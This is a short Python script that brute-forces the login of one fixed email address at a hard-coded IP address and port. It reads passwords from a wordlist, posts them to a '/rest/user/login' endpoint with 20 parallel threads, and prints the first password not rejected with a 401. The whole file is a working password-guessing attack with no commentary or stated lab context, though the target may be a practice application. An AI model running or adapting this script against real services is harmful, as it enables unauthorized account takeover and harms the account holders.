import json
import sys
from multiprocessing.pool import ThreadPool

import requests

with open("./wordlist.txt") as f:
    passwords = f.readlines()
passwords = [x.strip() for x in passwords]

s = requests.Session()
failed = 0


def test_password(password):
    global failed
    # print(failed)
    data = {"email": 'Maggie.Simpson@simpsonmail.com', "password": password, }
    data_json = json.dumps(data)
    headers = {
        'Content-type': 'application/json;charset=utf-8',
        'Referer': 'http://43.241.202.33:3003/',
    }

    r = s.post(
        'http://43.241.202.33:3003/rest/user/login',
        data=data_json,
        headers=headers,
    )

    if r.status_code != 401:
        print(failed)
        print(r)
        print(password)
        sys.exit()
    else:
        failed = failed + 1
        if failed % 10000 == 0:
            print(failed)


print("Total Passwords:", len(passwords))
with ThreadPool(20) as p:
    p.map(test_password, passwords)
print("Finished")
